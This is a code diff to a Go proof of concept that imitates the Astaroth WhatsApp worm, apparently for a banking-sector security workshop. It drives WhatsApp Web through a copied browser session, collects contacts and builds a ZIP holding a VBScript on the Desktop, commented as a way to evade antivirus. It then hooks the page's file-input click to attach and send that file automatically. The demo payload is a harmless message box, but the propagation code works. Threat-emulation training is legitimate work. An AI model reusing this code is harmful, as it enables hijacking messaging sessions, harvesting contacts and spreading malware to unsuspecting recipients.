@@ -1,6 +1,7 @@
 package main
 
 import (
+	"archive/zip"
 	"fmt"
 	"io"
 	"log"
@@ -238,10 +239,18 @@ func waitForWhatsApp(page *rod.Page) bool {
 }
 
 func main() {
-	fmt.Println("╔══════════════════════════════════════════════════════╗")
-	fmt.Println("║   Astaroth WhatsApp Worm - POC Educacional (Go)    ║")
-	fmt.Println("║   FEBRABAN - Análise de Ameaças Cibernéticas       ║")
-	fmt.Println("╚══════════════════════════════════════════════════════╝")
+	fmt.Println("\033[36m") // Cyan/Azul para o SWaNk
+	fmt.Println("  ___________      __          _______   __    ")
+	fmt.Println(" /   _____/  \\    /  \\_____    \\      \\ |  | __")
+	fmt.Println(" \\_____  \\\\   \\/\\/   /\\__  \\   /   |   \\|  |/ /")
+	fmt.Println(" /        \\\\        /  / __ \\_/    |    \\    < ")
+	fmt.Println("/_______  / \\__/\\  /  (____  /\\____|__  /__|_ \\")
+	fmt.Println("        \\/       \\/        \\/         \\/     \\/")
+	fmt.Println("\033[0m")
+	fmt.Println("╔══════════════════════════════════════════════════╗")
+	fmt.Println("║        SWaNk - criando pequenos monstros         ║")
+	fmt.Println("║    FEBRABAN - Análise de Ameaças Cibernéticas    ║")
+	fmt.Println("╚══════════════════════════════════════════════════╝")
 	fmt.Println()
 
 	// ETAPA 1: Auto-detecção e cópia do perfil
@@ -387,139 +396,197 @@ func main() {
 
 	if targetChat == nil {
 		fmt.Println("[!] Chat 'Eu' não encontrado. Tentando pelo primeiro chat...")
-		// Fallback: clica no primeiro chat da lista
 		firstRow, err := page.Element("div[role='row']")
 		if err != nil {
 			log.Printf("[!] Nenhum chat encontrado: %v", err)
-			fmt.Println("[*] Pressione ENTER para fechar...")
-			var s string
-			fmt.Scanln(&s)
-			return
+		} else {
+			firstRow.MustClick()
 		}
-		firstRow.MustClick()
 	} else {
 		targetChat.MustClick()
 	}
 
-	time.Sleep(2 * time.Second)
+	time.Sleep(3 * time.Second)
 	fmt.Println("[+] Chat aberto!")
 
-	// Cria o arquivo falso "ehVerdadeEsseBilete.exe.pdf"
-	fakeFileName := "ehVerdadeEsseBilete.exe.pdf"
-	fakePath := filepath.Join(os.TempDir(), fakeFileName)
-	fakeContent := []byte("[ASTAROTH POC] Este arquivo é uma demonstração educacional.\nEm um ataque real, seria um downloader malicioso.\nFEBRaBAN Workshop - Análise de Ameaças Cibernéticas\n")
-	os.WriteFile(fakePath, fakeContent, 0644)
-	defer os.Remove(fakePath)
-	fmt.Printf("[+] Arquivo falso criado: %s\n", fakePath)
+	// Envia mensagem usando a API do go-rod (simula digitação humana)
+	// O WhatsApp agora usa o Lexical Editor
+	finalMsg := "That's all folks! Obrigado pela participação e presença nesse Workshop da FEBRABAN!"
+	fmt.Println("[*] Encontrando caixa de mensagem (Lexical Editor)...")
 
-	// Clica no botão de anexo (+)
-	fmt.Println("[*] Abrindo menu de anexo...")
-	attachBtn, err := page.Element("[data-testid='clip']")
-	if err != nil {
-		// Fallback: tenta o seletor alternativo
-		attachBtn, err = page.Element("div[title='Attach']")
-	}
-	if err != nil {
-		attachBtn, _ = page.Element("span[data-icon='plus']")
+	// Tenta múltiplas variações de seletor baseadas no HTML fornecido
+	var chatBox *rod.Element
+	selectors := []string{
+		`div[contenteditable="true"][data-lexical-editor="true"]`,
+		`div[contenteditable="true"][data-tab="10"]`,
+		`div[contenteditable="true"][role="textbox"]`,
 	}
 
-	if attachBtn != nil {
-		attachBtn.MustClick()
+	for _, sel := range selectors {
+		elements, _ := page.Elements(sel)
+		if len(elements) > 0 {
+			// A última caixa na página costuma ser a de chat (a primeira é a de busca)
+			chatBox = elements[len(elements)-1]
+			break
+		}
+	}
+
+	if chatBox != nil {
+		fmt.Println("[*] Caixa de mensagem encontrada! Injetando texto via simulação de teclado...")
+		chatBox.MustClick()
 		time.Sleep(1 * time.Second)
 
-		// Encontra o input de arquivo e define o arquivo
-		// O WhatsApp cria inputs[type=file] quando o menu de anexo abre
-		fileInputs, _ := page.Elements("input[type='file']")
-		if len(fileInputs) > 0 {
-			fmt.Println("[+] Input de arquivo encontrado! Enviando anexo...")
-			fileInputs[0].MustSetFiles(fakePath)
-			time.Sleep(3 * time.Second)
+		// Simula a digitação real (dispara todos os eventos do React/Lexical corretamente)
+		chatBox.MustInput(finalMsg)
+		time.Sleep(1 * time.Second)
 
-			// Adiciona a legenda/caption na caixa de texto do modal de envio
-			captionBox, err := page.Element("div[contenteditable='true']")
-			if err == nil {
-				captionMsg := "That's all folks! Obrigado pela participação e presença nesse Workshop da FEBRABAN!"
-				captionBox.MustClick().MustInput(captionMsg)
-				time.Sleep(1 * time.Second)
+		// Pressiona Enter para enviar a mensagem de texto
+		chatBox.MustType(input.Enter)
+		fmt.Println("[+] Mensagem de texto enviada!")
 
-				// Clica em enviar (botão verde)
-				sendBtn, err := page.Element("[data-testid='send']")
-				if err != nil {
-					sendBtn, _ = page.Element("span[data-icon='send']")
+		time.Sleep(2 * time.Second)
+
+		// ETAPA 4.1: Anexar arquivo do Desktop!
+		fmt.Println("[*] Preparando envio de arquivo falso...")
+		// Pegar o Desktop do usuário
+		homeDir, _ := os.UserHomeDir()
+		desktopDir := filepath.Join(homeDir, "Desktop")
+
+		// Criar arquivo VBS real dentro de um ZIP para evadir AV
+		vbsFileName := "EhVerdadeEsseBilete.vbs"
+		zipFileName := "EhVerdadeEsseBilete.zip"
+		fakePath := filepath.Join(desktopDir, zipFileName)
+
+		// Cria o arquivo ZIP no Desktop
+		zipFile, err := os.Create(fakePath)
+		if err == nil {
+			zipWriter := zip.NewWriter(zipFile)
+			// Adiciona o VBS dentro do ZIP
+			vbsWriter, _ := zipWriter.Create(vbsFileName)
+			vbsContent := []byte("MsgBox \"That's all folks!\", vbInformation, \"SWaNk 2026\"\n")
+			vbsWriter.Write(vbsContent)
+			zipWriter.Close()
+			zipFile.Close()
+			fmt.Printf("[+] Criado arquivo ZIP contendo VBScript no Desktop: %s\n", fakePath)
+		} else {
+			fmt.Printf("[!] Erro ao criar ZIP: %v\n", err)
+		}
+
+		// Clica no botão de anexo baseado no DOM real fornecido
+		attachBtn, err := page.Element(`button[aria-label="Attach"]`)
+		if err != nil {
+			attachBtn, _ = page.Element(`div[title="Attach"]`)
+		}
+
+		if attachBtn != nil {
+			fmt.Println("[+] Botão de anexo encontrado! Clicando...")
+			attachBtn.MustClick()
+			time.Sleep(1 * time.Second)
+
+			// 1. Hook JavaScript definitivo: Marcamos o input alvo que o WhatsApp tenta abrir!
+			// Em vez de bloquear o CDP, injetamos um atributo customizado (data-bot-target="true")
+			// no exato momento que o React tenta abrir a janela do Windows.
+			fmt.Println("[*] Instalando Hook no Evento de Clique nativo...")
+			page.Eval(`() => {
+				const origClick = HTMLInputElement.prototype.click;
+				HTMLInputElement.prototype.click = function() {
+					if (this.type === 'file') {
+						this.setAttribute('data-bot-target', 'true');
+						// Evitar que o OS abra o File Chooser e trave o Chromium automation
+						return;
+					}
+					origClick.apply(this, arguments);
+				};
+			}`)
+			time.Sleep(500 * time.Millisecond)
+
+			// 2. Clicamos no botão nativo "Documento" que surgiu no menu
+			fmt.Println("[*] Simulando clique humano no ícone de Documentos...")
+			page.Eval(`() => {
+				let items = document.querySelectorAll('li, div[role="button"], span');
+				for (let el of items) {
+					let text = el.innerText ? el.innerText.trim().toLowerCase() : '';
+					if (text === 'document' || text === 'documento') {
+						let btn = el.closest('li') || el.closest('[role="button"]') || el;
+						btn.click();
+						return;
+					}
 				}
-				if sendBtn != nil {
-					sendBtn.MustClick()
-					fmt.Println("[+] Mensagem com anexo enviada!")
-				} else {
-					// Fallback: envia com Enter
-					captionBox.MustType(input.Enter)
-					fmt.Println("[+] Mensagem com anexo enviada (via Enter)!")
+				// Fallback para seleção de documento
+				let fallback = document.querySelector('[data-testid="attach-document"]');
+				if (fallback) fallback.click();
+			}`)
+			time.Sleep(1 * time.Second)
+
+			// 3. Magia: O WhatsApp tentou abrir a janela e nosso hook marcou o input certo.
+			fmt.Println("[*] Buscando a armadilha do input Documento no DOM...")
+			targetInput, err := page.Element(`input[data-bot-target="true"]`)
+			if err == nil && targetInput != nil {
+				targetInput.MustSetFiles(fakePath)
+				fmt.Println("[+] Upload ZIP injetado com 100% de sucesso na interface do Documento!")
+			} else {
+				fmt.Println("[!] Aviso: O hook falhou em marcar o input. Entrando com injeção cega fallback...")
+				inputs, _ := page.Elements(`input[type="file"][accept="*"]`)
+				if len(inputs) > 0 {
+					inputs[len(inputs)-1].MustSetFiles(fakePath)
 				}
 			}
+
+			// 4. Limpeza nativa para estabilidade da sessão posterior
+			page.Eval(`() => {
+				delete HTMLInputElement.prototype.click;
+			}`)
+
+			time.Sleep(3 * time.Second)
+
+			// Aguarda modal de preview e tenta clicar no botão de enviar
+			fmt.Println("[*] Tela de preview carregada. Pressionando botão de envio...")
+
+			// Tenta buscar o botão de enviar usando os seletores do DOM real fornecido
+			// <div aria-label="Send" role="button"> ou <span data-icon="wds-ic-send-filled">
+			var sendBtn *rod.Element
+
+			// Tenta o div[aria-label="Send"] (mais confiável segundo o DOM fornecido)
+			elements, _ := page.Elements(`div[aria-label="Send"][role="button"]`)
+			if len(elements) > 0 {
+				sendBtn = elements[0]
+			} else {
+				// Fallback para o ícone interno
+				elements, _ = page.Elements(`span[data-icon="wds-ic-send-filled"]`)
+				if len(elements) > 0 {
+					sendBtn = elements[0]
+				}
+			}
+
+			if sendBtn != nil {
+				sendBtn.MustClick()
+				fmt.Println("[+] Arquivo anexado e enviado com sucesso!")
+				time.Sleep(2 * time.Second)
+			} else {
+				fmt.Println("[!] Não encontrou botão de enviar. Tentando Enter como fallback extremo...")
+				page.Keyboard.MustType(input.Enter)
+				time.Sleep(2 * time.Second)
+			}
+
 		} else {
-			fmt.Println("[!] Input de arquivo não encontrado. Enviando apenas texto...")
-			// Fallback: envia somente a mensagem de texto
-			sendTextOnly(page)
+			fmt.Println("[!] Botão de anexo (Attach) não encontrado no DOM.")
 		}
+
 	} else {
-		fmt.Println("[!] Botão de anexo não encontrado. Enviando apenas texto...")
-		sendTextOnly(page)
+		log.Println("[!] Erro: Caixa de mensagem não encontrada no DOM.")
 	}
 
 	time.Sleep(2 * time.Second)
 
-	// Popup GRAND FINALE (único popup — mostrado DEPOIS de todas as ações no browser)
+	fmt.Println("\n[!!] ==========================================")
+	fmt.Println("[!!]  GRAND FINALE - DEMONSTRAÇÃO CONCLUÍDA")
+	fmt.Println("[!!] ==========================================")
+
 	mu.Lock()
-	totalContacts := len(collectedContacts)
-	contactListStr := formatContacts(collectedContacts)
+	fmt.Printf("[*] Total de contatos extraídos: %d\n", len(collectedContacts))
 	mu.Unlock()
 
-	go messageBox(
-		"Astaroth POC - SESSAO COMPROMETIDA",
-		fmt.Sprintf(
-			"SESSAO WHATSAPP COMPROMETIDA!\n\n"+
-				"O malware fez tudo AUTOMATICAMENTE:\n"+
-				"------------------------------\n"+
-				"1. Clonou a sessao do Chrome\n"+
-				"2. Abriu o WhatsApp SEM senha\n"+
-				"3. Coletou %d contatos\n"+
-				"4. Enviou 'ehVerdadeEsseBilete.exe.pdf'\n"+
-				"------------------------------\n\n"+
-				"Contatos expostos:\n%s\n\n"+
-				"That's all folks!\n"+
-				"FEBRABAN Workshop 2026",
-			totalContacts,
-			contactListStr,
-		),
-		MB_ICONWARNING|MB_TOPMOST,
-	)
-
-	fmt.Println("\n[!!] ==========================================")
-	fmt.Println("[!!]  GRAND FINALE - DEMONSTRAÇÃO CONCLUÍDA!")
-	fmt.Println("[!!] ==========================================")
 	fmt.Println("[*] POC concluída. Pressione ENTER para fechar.")
 	var inputStr string
 	fmt.Scanln(&inputStr)
-}
-
-// sendTextOnly envia apenas a mensagem de texto sem anexo (fallback)
-func sendTextOnly(page *rod.Page) {
-	chatBox, err := page.Element("div[contenteditable='true'][data-tab='10']")
-	if err != nil {
-		chatBox, _ = page.Element("div[contenteditable='true']")
-	}
-	if chatBox != nil {
-		msg := "That's all folks! Obrigado pela participação e presença nesse Workshop da FEBRABAN! 🎯"
-		chatBox.MustClick().MustInput(msg)
-		chatBox.MustType(input.Enter)
-		fmt.Println("[+] Mensagem de texto enviada!")
-	}
-}
-
-func formatContacts(contacts []string) string {
-	var lines []string
-	for i, name := range contacts {
-		lines = append(lines, fmt.Sprintf("  %d. %s", i+1, name))
-	}
-	return strings.Join(lines, "\n")
 }
